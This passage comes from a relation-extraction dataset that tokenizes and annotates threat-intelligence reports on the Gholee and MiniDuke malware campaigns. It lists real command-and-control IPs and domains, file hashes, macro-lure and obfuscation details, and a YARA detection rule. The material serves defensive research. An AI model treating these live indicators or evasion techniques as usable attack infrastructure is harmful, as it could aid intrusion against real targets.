"Opposition", "Syrian", "Activists", "Targeted", "with", "BlackShades", "Spy"], ["Software"], ["How", "to", "Find", "and", "Protect", "Yourself", "Against", "the", "Pro\u00ad", "Syrian\u00adGovernment", "Malware", "on", "Your", "Computer"], ["Fake", "YouTube", "Site", "Targets", "Syrian", "Activists", "With", "Malware", "Quantum", "of", "Surveillance", ":", "Familiar", "Actors", "and", "Possible", "False", "Flags", "in", "Syrian", "Malware", "Campaigns", "Related", "Posts"], ["CONTRIBUTING", "TO", "THE", "ANNUAL", "DBIR", "FREEZER", "PAPER"], ["AROUND", "FREE", "MEAT", "PNG", "EMBEDDED", "\u2013", "MALICIOUS", "PAYLOAD", "HIDDEN", "IN", "A", "THERE", "IS", "1", "COMMENT"], ["If", "you", "would", "like", "to", "comment", "on", "this", "article", "you", "must", "\ufb01rst", "login", "mohandas", "mv"], ["Posted", "on", "September", "29", ",", "2014", "."], ["5:24", "pm", "extreemly", "thankfull", "for", "the", "informations", "provided", "Reply", "https://securelist.com/blog/research/66051/the-syrian-malware-house-of-cards/", "7/7"]]}, {"vertexSet": [[{"name": "Israeli", "pos": [27, 28], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "Gholee", "pos": [0, 1], "sent_id": 7, "type": "Malware"}], [{"name": "Gholee", "pos": [4, 5], "sent_id": 8, "type": "Malware"}], [{"name": "Operation Protective Edge.xlsb", "pos": [6, 9], "sent_id": 9, "type": "File"}], [{"name": "d0c3f4c9896d41a7c42737134ffb4c2e", "pos": [13, 14], "sent_id": 9, "type": "MD5"}], [{"name": "10 August 2014", "pos": [13, 16], "sent_id": 10, "type": "Time"}], [{"name": "Israel", "pos": [18, 19], "sent_id": 10, "type": "Country"}], [{"name": "Kaspersky", "pos": [9, 10], "sent_id": 13, "type": "Organization"}], [{"name": "TrojanDropper.MSExcel.Agent.ce", "pos": [12, 13], "sent_id": 13, "type": "Malware"}], [{"name": "social engineering", "pos": [6, 8], "sent_id": 17, "type": "Exploit"}], [{"name": "NTUSER.data.{GUIDE}.dll", "pos": [8, 9], "sent_id": 25, "type": "Malware"}], [{"name": "48573a150562c57742230583456b4c02", "pos": [12, 13], "sent_id": 25, "type": "MD5"}], [{"name": "obfuscated", "pos": [5, 6], "sent_id": 27, "type": "Obfuscation"}], [{"name": "Gholee", "pos": [24, 25], "sent_id": 29, "type": "Malware"}], [{"name": "83.170.33.60", "pos": [16, 17], "sent_id": 30, "type": "Address"}], [{"name": "9C 80 C2 47 40 6D 6C ED FC E0 08 AE EF D9 98 90", "pos": [9, 25], "sent_id": 39, "type": "MD5"}], [{"name": "svchost 67.exe", "pos": [6, 8], "sent_id": 43, "type": "Malware"}], [{"name": "916be1b609ed3dc80e5039a1d8102e82", "pos": [12, 13], "sent_id": 43, "type": "MD5"}], [{"name": "83.170.33.37", "pos": [6, 7], "sent_id": 45, "type": "Address"}], [{"name": "Operation Protective Edge.xlsb", "pos": [19, 22], "sent_id": 45, "type": "File"}], [{"name": "83.170.33.60", "pos": [0, 1], "sent_id": 51, "type": "Address"}], [{"name": "83.170.33.37", "pos": [0, 1], "sent_id": 52, "type": "Address"}], [{"name": "NTUSER.DAT.{$GUID}.dll", "pos": [18, 19], "sent_id": 53, "type": "File"}]], "labels": [{"r": "P21", "h": 3, "t": 2, "evidence": [8, 9]}, {"r": "P21", "h": 4, "t": 2, "evidence": [8, 9]}, {"r": "P33", "h": 2, "t": 5, "evidence": [8, 10]}, {"r": "P32", "h": 2, "t": 6, "evidence": [8, 10]}, {"r": "P32", "h": 9, "t": 6, "evidence": [10, 17]}, {"r": "P21", "h": 11, "t": 10, "evidence": [25]}, {"r": "P13", "h": 10, "t": 12, "evidence": [25, 27]}, {"r": "P28", "h": 13, "t": 14, "evidence": [29, 30]}, {"r": "P21", "h": 15, "t": 13, "evidence": [29, 39]}, {"r": "P21", "h": 17, "t": 16, "evidence": [43]}, {"r": "P28", "h": 16, "t": 18, "evidence": [43, 45]}, {"r": "P21", "h": 19, "t": 16, "evidence": [43, 45]}], "title": "201409ClearSkyGholee", "sents": [["http://www.clearskysec.com/gholee-a-protective-", "..."], ["Introduction"], ["During", "the", "2014", "Israel", "\u2013", "Gaza", "con", "\ufffd", "ict", ",", "dubbed", "by", "Israel", "as", "\u201c", "operation", "protective", "edge", "\u201d", ",", "a", "raise", "in", "cyber", "-", "attacks", "against", "Israeli", "targets", "was", "reported", "."], ["In", "this", "report", "we", "analyze", "one", "case", "of", "an", "operation", "protective", "edge", "themed", "spear", "phishing", "attack", "."], ["That", "email", "contained", "a", "malicious", "excel", "\ufffd", "le", ",", "which", "once", "opened", "and", "its", "VBA", "code", "executed", ",", "would", "infect", "the", "victim", "\u2019s", "computer", "."], ["As", "for", "the", "publication", "of", "this", "report", ",", "the", "\ufffd", "le", "is", "recognized", "as", "malicious", "by", "only", "one", "antivirus", "engine", "."], ["Based", "on", "our", "analysis", ",", "we", "believe", "the", "threat", "actor", "behind", "this", "malware", "is", "a", "high", "level", "professional", "."], ["Gholee"], ["Our", "investigation", "of", "the", "Gholee", "malware", "started", "following", "a", "detection", "of", "a", "suspicious", "\ufffd", "le", "that", "was", "sent", "in", "an", "email", "to", "an", "undisclosed", "recipient", "."], ["The", "\ufffd", "le", "name", "was", "\u2018", "Operation", "Protective", "Edge.xlsb", "\u2019", "(", "MD5", ":", "d0c3f4c9896d41a7c42737134ffb4c2e", ")", "."], ["The", "\ufffd", "le", "was", "uploaded", "to", "Virus", "Total", "the", "\ufffd", "rst", "time", "on", "10", "August", "2014", ",", "from", "Israel", "."], ["At", "that", "time", "it", "was", "not", "detected", "as", "malicious", "by", "any", "of", "the", "52", "tested", "antivirus", "engines", "."], ["Nine", "days", "later", ",", "it", "was", "1", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "...", "uploaded", "again", "to", "Virus", "total", ",", "again", "from", "Israel", "."], ["This", "time", "it", "was", "detected", "as", "malicious", "only", "by", "Kaspersky", ",", "as", "TrojanDropper.MSExcel.Agent.ce", "."], ["Infection"], ["Upon", "opening", "the", "\ufffd", "le", "a", "message", "is", "displayed", ",", "saying", ":", "\u201c", "Due", "to", "security", "considerations", "I", "consciously", "hid", "the", "Informations", "."], ["It", "will", "be", "visible", "for", "you", "by", "enabling", "content", "above", ".", "\u201d"], ["[", "1", "]", "This", "is", "a", "social", "engineering", "tactic", "meant", "to", "lure", "the", "victim", "into", "enabling", "Macro", "content", "."], ["If", "enabled", ",", "the", "message", "disappears", ",", "and", "the", "following", "information", "is", "presented", "to", "the", "victim", "(", "it", "is", "possible", "that", "the", "unreadable", "characters", "in", "the", "screenshot", "below", "are", "the", "result", "of", "an", "encoding", "error", "in", "our", "lab", "environment", ",", "and", "that", "the", "victim", "would", "see", "different", ",", "readable", "content", ")", "."], ["Technical", "Analysis"], ["Analysis", "of", "the", "Macro", "code", "reveals", "the", "following", "structure", ":"], ["In", "order", "to", "avoid", "detection", "by", "protection", "measures", "such", "as", "computer", "antivirus", "and", "intrusion", "detection", "systems", ",", "ASCII", "2", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "...", "characters", "codes", "are", "used", "instead", "of", "actual", "characters", "."], ["The", "ASCII", "codes", "are", "converted", "to", "strings", "as", "they", "are", "concatenated", "into", "a", "single", "variable", "within", "a", "function"], ["Tens", "of", "these", "functions", "then", "concatenated", ",", "creating", "a", "single", "PE", "\ufffd", "le"], ["[", "2", "]", "[", "3", "]"], ["Finally", ",", "the", "\ufffd", "le", "is", "saved", "to", "NTUSER.data.{GUIDE}.dll", "(", "MD5", ":", "48573a150562c57742230583456b4c02", ")", "and", "the", "function"], ["ShellExecte", "is", "used", "to", "run", "it", "under", "cmd.exe", "/C", "and", "Rundll32", "This", "is", "in", "order", "to", "hide", "the", "process", "."], ["The", "Dll", "\ufffd", "le", "is", "obfuscated", "and", "includes", "various", "mechanism", "to", "hide", "from", "Debuggers", "such", "as", "Ollydbg", "and", "IDA", "and", "from", "Sandbox", "software", "such", "as", "Cuckoo", "and", "Anubis", "."], ["Analyzing", "the", "\ufffd", "le", ",", "we", "have", "found", "an", "interesting", "entry", "point", "called", "gholee", "."], ["3", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "...", "[", "4", "]", "[", "5", "]", "A", "quick", "Facebook", "search", "for", "that", "name", "and", "Iran", "discovered", "Gholee", "is", "a", "popular", "Iranian", "singer", ":", "[", "6", "]", "Communication"], ["When", "run", ",", "the", "DLL", "\ufffd", "le", "is", "communicating", "with", "a", "Kuwait", "based", "IP", "address", ":", "83.170.33.60", ",", "owned", "by", "German", "company", "iABG"], ["Mbh", ",", "which", "provides", "satellite", "communication", "services", "."], ["4", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "..."], ["[", "7", "]"], ["The", "malware", "opens", "an", "SSL", "connection", "over", "port", "443", "using", "a", "digital", "certi", "\ufffd", "cate", "that", "expired", "in", "2010", "."], ["The", "certi", "\ufffd", "cate", "was", "issued", "for", "security", "company", "Core", "Security", ",", "the", "creators", "of", "the", "offensive", "suite", "Core", "Impact", ",", "for", "the", "address", "*", "coreimpactagent.net", "."], ["[", "8", "]", "[", "9", "]"], ["It", "was", "issued", "by", "Thawte", "certi", "\ufffd", "cate", "authority", "."], ["[", "10", "]", "5", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "..."], ["[", "11", "]", "Certi", "\ufffd", "cate", "Fingerprint", "MD5", ":", "9C", "80", "C2", "47", "40", "6D", "6C", "ED", "FC", "E0", "08", "AE", "EF", "D9", "98", "90"], ["Using", "a", "proxy", "and", "SSL", "stripping", ",", "the", "following", "communication", "pattern", "over", "HTTP", "can", "be", "seen", ":", "GET", "/index.php?c", "=", "Ud7atknq&r=17117d", "HTTP/1.1", "POST", "/index.php?c", "=", "Ud7atknq&r=1710b2"], ["HTTP/1.1", "Related", "incidents"], ["Searching", "for", "speci", "\ufffd", "c", "strings", "from", "the", "malicious", "\ufffd", "le", ",", "we", "found", "another", "\ufffd", "le", "that", "we", "believe", "is", "related", "to", "this", "campaign", "."], ["The", "\ufffd", "le", "name", "is", "\u201c", "svchost", "67.exe", "\u201d", "(", "MD5", ":", "916be1b609ed3dc80e5039a1d8102e82", ")", "and", "it", "was", "uploaded", "to", "Virus", "Total[5", "]", "on", "2", "June", "2014", ",", "more", "than", "two", "months", "earlier", "than", "\u201c", "Operation", "Protective", "Edge.xlsb", "\u201d", "."], ["It", "was", "uploaded", "twice", "from", "Latvia", "\u2013", "potentially", "to", "test", "the", "malware", "\u2019s", "detection", "rate", "."], ["\u201c", "svchost", "67.exe", "\u201d", "communicated", "with", "83.170.33.37", ",", "which", "is", "on", "the", "same", "/26", "netblock", "as", "the", "address", "\u201c", "Operation", "Protective", "Edge.xlsb", "\u201d", "6", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "...", "is", "commutating", "with", "."], ["Detection", "and", "prevention"], ["By", "using", "GPO", "to", "disable", "macro", "code", "from", "running", ",", "infection", "by"], ["this", "malware", "may", "be", "avoided", "."], ["Alternatively", ",", "\ufffd", "les", "containing", "macro", "code", "should", "be", "blocked", "at", "the", "email", "gateway", "or", "by", "an", "anti", "-", "spam", "solution", "."], ["Logs", "and", "proxy", "servers", "should", "be", "checked", "for", "communication", "with", "the", "IP", "addresses", "with", "which", "the", "malware", "communicates", ":"], ["83.170.33.60"], ["83.170.33.37"], ["If", "you", "think", "you", "got", "infected", ",", "check", "in", "the", "system", "root", "folder", "for", "a", "\ufffd", "le", "called", "NTUSER.DAT.{$GUID}.dll", "."], ["for", "example", ":", "NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0b**c}.dll"], ["The", "following", "Yara", "rule", "may", "be", "used", "to", "detect", "the", "gholee", "malware", ":", "rule", "gholee", "meta", ":", "author", "=", "\u201c", "www.clearskysec.com", "\u201d", "date", "=", "\u201c", "2014/08\u2033", "7", "of", "8", "03/22/2015", "07:49", "PM", "http://www.clearskysec.com/gholee-a-protective-", "...", "maltype", "=", "\u201c", "Remote", "Access", "Trojan", "\u201d", "\ufffd", "letype", "=", "\u201c", "dll", "\u201d", "strings", ":", "$", "a", "=", "\u201c", "sandbox_avg10_vc9_SP1_2011\u2033", "$", "b", "=", "\u201c", "gholee", "\u201d", "condition", ":", "all", "of", "them", "1", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/2.png", "2", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/5.png", "3", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/5.png", "4", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/6.png", "5", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/6.png", "6", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/1.png", "7", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/7.png", "8", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/8.png", "9", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/8.png", "10", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/9.png", "11", "."], ["http://www.clearskysec.com/wp-content/uploads/2014/09/9.png", "8", "of", "8", "03/22/2015", "07:49", "PM"]]}, {"vertexSet": [[{"name": "MiniDuke", "pos": [1, 2], "sent_id": 0, "type": "Malware"}], [{"name": "Costin Raiu", "pos": [2, 4], "sent_id": 3, "type": "Person"}], [{"name": "Igor Soumenkov", "pos": [5, 7], "sent_id": 3, "type": "Person"}], [{"name": "Kurt Baumgartner", "pos": [8, 10], "sent_id": 3, "type": "Person"}], [{"name": "Vitaly Kamluk", "pos": [11, 13], "sent_id": 3, "type": "Person"}], [{"name": "Kaspersky Lab", "pos": [19, 21], "sent_id": 3, "type": "Organization"}], [{"name": "Feb 12th 2013", "pos": [1, 4], "sent_id": 4, "type": "Time"}], [{"name": "E", "pos": [5, 6], "sent_id": 4, "type": "Organization"}], [{"name": "Adobe Reader 0-day", "pos": [14, 19], "sent_id": 4, "type": "Exploit"}], [{"name": "ItaDuke", "pos": [6, 7], "sent_id": 5, "type": "Malware"}], [{"name": "Duqu", "pos": [13, 14], "sent_id": 5, "type": "Malware"}], [{"name": "CVE-2013-0640", "pos": [16, 19], "sent_id": 6, "type": "Vulnerability"}], [{"name": "CrySyS Lab", "pos": [4, 6], "sent_id": 7, "type": "Organization"}], [{"name": "Visaform Tukey.pdf", "pos": [49, 51], "sent_id": 10, "type": "Dropper"}], [{"name": "FireEye", "pos": [54, 55], "sent_id": 10, "type": "Organization"}], [{"name": "MiniDuke", "pos": [1, 2], "sent_id": 12, "type": "Malware"}], [{"name": "NATO", "pos": [17, 18], "sent_id": 14, "type": "Organization"}], [{"name": "3668b018b4bb080d1875aee346e3650a", "pos": [0, 1], "sent_id": 18, "type": "MD5"}], [{"name": "88292d7181514fda5390292d73da28d4", "pos": [1, 2], "sent_id": 18, "type": "MD5"}], [{"name": "3f301758aa3d5d123a9ddbad1890853b", "pos": [2, 3], "sent_id": 18, "type": "MD5"}], [{"name": "0cdf55626e56ffbf1b198beb4f6ed559", "pos": [3, 4], "sent_id": 18, "type": "MD5"}], [{"name": "cf5a5239ada9b43592757c0d7bf66169", "pos": [0, 1], "sent_id": 19, "type": "MD5"}], [{"name": "c03bcb0cde62b3f45b4d772ab635e2b0", "pos": [1, 2], "sent_id": 19, "type": "MD5"}], [{"name": "action_plan.pdf", "pos": [2, 3], "sent_id": 19, "type": "Dropper"}], [{"name": "Belgium", "pos": [6, 7], "sent_id": 19, "type": "Country"}], [{"name": "ASEM_seminar.pdf", "pos": [0, 1], "sent_id": 20, "type": "Dropper"}], [{"name": "Hungary", "pos": [4, 5], "sent_id": 20, "type": "Country"}], [{"name": "EUAG_report.pdf", "pos": [0, 1], "sent_id": 21, "type": "Dropper"}], [{"name": "Luxembourg", "pos": [4, 5], "sent_id": 21, "type": "Country"}], [{"name": "report.pdf", "pos": [0, 1], "sent_id": 22, "type": "Dropper"}], [{"name": "Spain", "pos": [4, 5], "sent_id": 22, "type": "Country"}], [{"name": "EUAG_report.pdf", "pos": [0, 1], "sent_id": 23, "type": "Dropper"}], [{"name": "Belgium", "pos": [4, 5], "sent_id": 23, "type": "Country"}], [{"name": "The 2013 Armenian Economic Association.pdf", "pos": [0, 5], "sent_id": 24, "type": "Dropper"}], [{"name": "Belgium", "pos": [8, 9], "sent_id": 24, "type": "Country"}], [{"name": "RtlDecompressBuffer API", "pos": [16, 18], "sent_id": 38, "type": "Software"}], [{"name": "LoadLibary API", "pos": [13, 15], "sent_id": 39, "type": "Software"}], [{"name": "Resource 101", "pos": [0, 2], "sent_id": 42, "type": "Malware"}], [{"name": "Resource 102", "pos": [0, 2], "sent_id": 44, "type": "Malware"}], [{"name": "c:\\src\\dlldropper\\Release\\L2P.pdb", "pos": [13, 14], "sent_id": 49, "type": "Dropper"}], [{"name": "C:\\src\\hellodll\\Release\\hellodll.pdb", "pos": [1, 2], "sent_id": 50, "type": "Dropper"}], [{"name": "Feb 20, 2013", "pos": [14, 18], "sent_id": 54, "type": "Time"}], [{"name": "Feb 20 10:51:16 2013", "pos": [27, 31], "sent_id": 54, "type": "Time"}], [{"name": "Feb 20 10:57:52 2013", "pos": [11, 15], "sent_id": 55, "type": "Time"}], [{"name": "ROL\u2019ed with a linear key", "pos": [15, 20], "sent_id": 74, "type": "Obfuscation"}], [{"name": "XOR\u2019ed with a fixed key", "pos": [21, 26], "sent_id": 74, "type": "Obfuscation"}], [{"name": "apispy32.exe", "pos": [0, 1], "sent_id": 91, "type": "Software"}], [{"name": "MiniDuke", "pos": [3, 4], "sent_id": 109, "type": "Malware"}], [{"name": "uri!", "pos": [3, 5], "sent_id": 111, "type": "Indicator"}], [{"name": "Hungary", "pos": [15, 16], "sent_id": 112, "type": "Country"}], [{"name": "arabooks[dot]ch", "pos": [16, 17], "sent_id": 112, "type": "Indicator"}], [{"name": "194.38.160.153", "pos": [17, 18], "sent_id": 112, "type": "Address"}], [{"name": "Switzerland", "pos": [0, 1], "sent_id": 113, "type": "Country"}], [{"name": "/lib/index.php", "pos": [1, 4], "sent_id": 113, "type": "Indicator"}], [{"name": "Luxemburg", "pos": [4, 5], "sent_id": 113, "type": "Country"}], [{"name": "artas[dot]org", "pos": [5, 6], "sent_id": 113, "type": "Indicator"}], [{"name": "95.128.72.24", "pos": [6, 7], "sent_id": 113, "type": "Address"}], [{"name": "France", "pos": [8, 9], "sent_id": 113, "type": "Country"}], [{"name": "/engine/index.php", "pos": [9, 12], "sent_id": 113, "type": "Indicator"}], [{"name": "Belgium", "pos": [12, 13], "sent_id": 113, "type": "Country"}], [{"name": "tsoftonline[dot]com", "pos": [13, 14], "sent_id": 113, "type": "Indicator"}], [{"name": "72.34.47.186", "pos": [14, 15], "sent_id": 113, "type": "Address"}], [{"name": "United", "pos": [16, 17], "sent_id": 113, "type": "Country"}], [{"name": "/views/index.php", "pos": [18, 21], "sent_id": 113, "type": "Indicator"}], [{"name": "www[dot]eamtm[dot]co m", "pos": [24, 26], "sent_id": 113, "type": "Indicator"}], [{"name": "188.40.99.143", "pos": [26, 27], "sent_id": 113, "type": "Address"}], [{"name": "Germany", "pos": [28, 29], "sent_id": 113, "type": "Country"}], [{"name": "/piwik/web/index.php", "pos": [0, 5], "sent_id": 114, "type": "Indicator"}], [{"name": "lUFEfiHKljfLKWPR", "pos": [12, 13], "sent_id": 117, "type": "Indicator"}], [{"name": "Duqu", "pos": [18, 19], "sent_id": 124, "type": "Malware"}], [{"name": "2011", "pos": [21, 22], "sent_id": 124, "type": "Time"}], [{"name": "DWORD", "pos": [5, 6], "sent_id": 125, "type": "Obfuscation"}], [{"name": "MiniDuke", "pos": [3, 4], "sent_id": 131, "type": "Malware"}], [{"name": "1109821546.gif", "pos": [37, 38], "sent_id": 145, "type": "Exploit"}], [{"name": "http://tsoftonline.com/views/img/1109821546.gif", "pos": [41, 42], "sent_id": 145, "type": "Exploit"}], [{"name": "Mon, 25 Feb 2013 12:34:13 GMT", "pos": [2, 9], "sent_id": 146, "type": "Time"}], [{"name": "Mon, 25 Feb 2013 10:59:49 GMT", "pos": [0, 7], "sent_id": 149, "type": "Time"}], [{"name": "UCL compression", "pos": [13, 15], "sent_id": 155, "type": "Obfuscation"}], [{"name": "Mon Jun 18 17:28:11 2012", "pos": [8, 13], "sent_id": 157, "type": "Time"}], [{"name": "200.63.46.23", "pos": [0, 1], "sent_id": 161, "type": "Address"}], [{"name": "200.63.46.23", "pos": [3, 4], "sent_id": 163, "type": "Address"}], [{"name": "Panama", "pos": [7, 8], "sent_id": 163, "type": "Country"}], [{"name": "1e1b0d16a16cf5c7f3a7c053ce78f515", "pos": [11, 12], "sent_id": 166, "type": "MD5"}], [{"name": "53db085a276ebbf5798ba756cac833ea", "pos": [12, 13], "sent_id": 166, "type": "MD5"}], [{"name": "6bc34809e44c40b61dd29e0a387ee682", "pos": [39, 40], "sent_id": 166, "type": "MD5"}], [{"name": "Turkey", "pos": [47, 48], "sent_id": 166, "type": "Country"}], [{"name": "85.95.236.114", "pos": [4, 5], "sent_id": 167, "type": "Address"}], [{"name": "Tue Nov 13 14:30:12 2012", "pos": [8, 13], "sent_id": 168, "type": "Time"}], [{"name": "Ukraine", "pos": [25, 26], "sent_id": 172, "type": "Country"}], [{"name": "Belgium", "pos": [30, 31], "sent_id": 172, "type": "Country"}], [{"name": "Portugal", "pos": [35, 36], "sent_id": 172, "type": "Country"}], [{"name": "Romania", "pos": [37, 38], "sent_id": 172, "type": "Country"}], [{"name": "Czech Republic", "pos": [56, 58], "sent_id": 172, "type": "Country"}], [{"name": "Ireland", "pos": [59, 60], "sent_id": 172, "type": "Country"}], [{"name": "United States", "pos": [61, 63], "sent_id": 172, "type": "Country"}], [{"name": "Hungary", "pos": [5, 6], "sent_id": 173, "type": "Country"}], [{"name": "Belgium", "pos": [27, 28], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Brazil", "pos": [29, 30], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Bulgaria", "pos": [31, 32], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Czech Republic", "pos": [33, 35], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Georgia", "pos": [36, 37], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Germany", "pos": [38, 39], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Hungary", "pos": [40, 41], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Ireland", "pos": [42, 43], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Israel", "pos": [44, 45], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Japan", "pos": [46, 47], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Latvia", "pos": [48, 49], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Lebanon", "pos": [50, 51], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Lithuania", "pos": [52, 53], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Montenegro", "pos": [54, 55], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Portugal", "pos": [56, 57], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Romania", "pos": [58, 59], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Russian Federation", "pos": [60, 62], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Slovenia", "pos": [63, 64], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Spain", "pos": [65, 66], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Turkey", "pos": [67, 68], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Ukraine", "pos": [69, 70], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "United Kingdom", "pos": [71, 73], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [74, 76], "sent_id": 173, "type": "ExploitTargetObject"}], [{"name": "Red October", "pos": [25, 27], "sent_id": 174, "type": "Campaign"}], [{"name": "Update Java to the latest version", "pos": [18, 24], "sent_id": 176, "type": "CourseOfAction"}], [{"name": "Update Microsoft Windows and Office to the latest versions", "pos": [0, 9], "sent_id": 177, "type": "CourseOfAction"}], [{"name": "Update Adobe Reader to the latest version", "pos": [0, 7], "sent_id": 178, "type": "CourseOfAction"}], [{"name": "arabooks.ch", "pos": [1, 2], "sent_id": 180, "type": "Indicator"}], [{"name": "artas.org", "pos": [3, 4], "sent_id": 180, "type": "Indicator"}], [{"name": "tsoftonline.com", "pos": [5, 6], "sent_id": 180, "type": "Indicator"}], [{"name": "www.eamtm.com", "pos": [7, 8], "sent_id": 180, "type": "Indicator"}], [{"name": "news.grouptumbler.com", "pos": [9, 10], "sent_id": 180, "type": "Indicator"}], [{"name": "200.63.46.23", "pos": [1, 2], "sent_id": 181, "type": "Address"}], [{"name": "194.38.160.153", "pos": [1, 2], "sent_id": 182, "type": "Address"}], [{"name": "95.128.72.24", "pos": [0, 1], "sent_id": 183, "type": "Address"}], [{"name": "72.34.47.186", "pos": [2, 3], "sent_id": 183, "type": "Address"}], [{"name": "188.40.99.143", "pos": [4, 5], "sent_id": 183, "type": "Address"}], [{"name": "85.95.236.114", "pos": [6, 7], "sent_id": 183, "type": "Address"}], [{"name": "Kaspersky Internet Security 2013", "pos": [11, 15], "sent_id": 184, "type": "Software"}], [{"name": "Be wary of opening suspicious documents on your systems", "pos": [0, 9], "sent_id": 185, "type": "CourseOfAction"}], [{"name": "use another computer without an Internet connection", "pos": [12, 19], "sent_id": 185, "type": "CourseOfAction"}], [{"name": "upload the document to Google Docs for viewing", "pos": [24, 32], "sent_id": 185, "type": "CourseOfAction"}], [{"name": "@34fZ7E*p\\", "pos": [55, 56], "sent_id": 185, "type": "Indicator"}], [{"name": "29A", "pos": [0, 1], "sent_id": 191, "type": "Attacker"}], [{"name": "HEUR:Backdoor.Win32.MiniDuke.gen", "pos": [9, 14], "sent_id": 199, "type": "Indicator"}], [{"name": "Backdoor.Win32.Miniduke", "pos": [15, 18], "sent_id": 199, "type": "Indicator"}], [{"name": "Exploit.JS.Pdfka.giy", "pos": [26, 27], "sent_id": 199, "type": "ExploitTargetObject"}]], "labels": [{"r": "P32", "h": 23, "t": 24, "evidence": [19]}, {"r": "P32", "h": 25, "t": 26, "evidence": [20]}, {"r": "P32", "h": 27, "t": 28, "evidence": [21]}, {"r": "P32", "h": 29, "t": 30, "evidence": [22]}, {"r": "P32", "h": 31, "t": 32, "evidence": [23]}, {"r": "P32", "h": 33, "t": 34, "evidence": [24]}, {"r": "P33", "h": 40, "t": 41, "evidence": [50, 54]}, {"r": "P33", "h": 39, "t": 41, "evidence": [49, 54]}, {"r": "P33", "h": 37, "t": 43, "evidence": [42, 55]}, {"r": "P21", "h": 48, "t": 47, "evidence": [109, 111]}, {"r": "P13", "h": 72, "t": 71, "evidence": [125, 131]}, {"r": "P34", "h": 135, "t": 15, "evidence": [12, 185]}, {"r": "P34", "h": 136, "t": 15, "evidence": [12, 185]}, {"r": "P34", "h": 137, "t": 15, "evidence": [12, 185]}, {"r": "P34", "h": 120, "t": 15, "evidence": [12, 176]}, {"r": "P34", "h": 121, "t": 15, "evidence": [12, 177]}, {"r": "P34", "h": 122, "t": 15, "evidence": [12, 178]}, {"r": "P28", "h": 15, "t": 128, "evidence": [12, 181]}, {"r": "P28", "h": 15, "t": 129, "evidence": [12, 182]}, {"r": "P28", "h": 15, "t": 130, "evidence": [12, 183]}, {"r": "P28", "h": 15, "t": 132, "evidence": [12, 183]}, {"r": "P28", "h": 15, "t": 131, "evidence": [12, 183]}, {"r": "P28", "h": 15, "t": 133, "evidence": [12, 183]}, {"r": "P28", "h": 15, "t": 51, "evidence": [12, 112]}, {"r": "P28", "h": 15, "t": 56, "evidence": [12, 113]}, {"r": "P28", "h": 15, "t": 61, "evidence": [12, 113]}, {"r": "P28", "h": 15, "t": 65, "evidence": [12, 113]}, {"r": "P28", "h": 15, "t": 79, "evidence": [12, 161]}, {"r": "P28", "h": 15, "t": 80, "evidence": [12, 163]}, {"r": "P28", "h": 15, "t": 86, "evidence": [12, 167]}, {"r": "P21", "h": 123, "t": 15, "evidence": [12, 180]}, {"r": "P21", "h": 124, "t": 15, "evidence": [12, 180]}, {"r": "P21", "h": 125, "t": 15, "evidence": [12, 180]}, {"r": "P21", "h": 126, "t": 15, "evidence": [12, 180]}, {"r": "P21", "h": 127, "t": 15, "evidence": [12, 180]}, {"r": "P21", "h": 138, "t": 15, "evidence": [12, 185]}, {"r": "P21", "h": 82, "t": 15, "evidence": [12, 166]}, {"r": "P21", "h": 83, "t": 15, "evidence": [12, 166]}, {"r": "P21", "h": 84, "t": 15, "evidence": [12, 166]}, {"r": "P21", "h": 50, "t": 15, "evidence": [12, 112]}, {"r": "P21", "h": 53, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 55, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 58, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 60, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 63, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 64, "t": 15, "evidence": [12, 113]}, {"r": "P21", "h": 67, "t": 15, "evidence": [12, 114]}, {"r": "P21", "h": 68, "t": 15, "evidence": [12, 117]}, {"r": "P21", "h": 140, "t": 15, "evidence": [12, 199]}, {"r": "P21", "h": 141, "t": 15, "evidence": [12, 199]}], "title": "201302KasperskyLabsMiniDuke", "sents": [["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day"], ["Government", 